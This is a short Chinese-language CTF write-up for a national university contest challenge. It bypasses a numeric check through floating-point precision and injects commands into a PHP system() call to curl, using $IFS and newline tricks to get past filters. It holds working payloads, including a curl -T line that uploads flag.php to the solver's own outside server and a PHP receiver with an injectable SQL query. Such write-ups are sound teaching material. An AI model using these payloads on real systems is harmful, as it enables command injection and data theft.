###此题是全国大学生CTF联赛的真题 


$num=0.9999999999999999999999999999999999999999999999  利用浮点数精度绕过



住要看 system(curl$cmd/flag);

$cmd不允许存在空格...
要读取文件,必须要构造一个空格出来,

利用Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符
echo $IFS   | od -b  

最后 $cmd=$IFS\file:///$PWD/flag.php
或者 $cmd=$IFS\file:///var/www/html/exam/flag.php$IFS\
    $cmd=$IFS"file:///$PWD/"
    
    $cmd=curl -T flag.php http://自己的服务器/getflag.php < ./flag.php
    getflag.php 
    ```
       <?php
        $db = new mysqli('localhost', 'root', 'root', 'getflag');
        $t = file_get_contents('php://input');
        $db->query("INSERT INTO `getflag` (`flag`) VALUES('{$t}')");
        ?>
    ```
    
    我发现的:$cmd=$IFS\-x$IFS\wonderkun.cc$IFS\-T$IFS\flag.php$IFS\http
    
---
另一种做法可以绕过过滤 : 
?num=0.99999999999999999&cmd=$1%09file://$PWD/getflag.php%0a1

---
还有再来一种做法 : 
?num=0.99999999999999999&cmd=0%0als%0a0
?num=0.99999999999999999&cmd=0%0acat<getflag.php%0a0
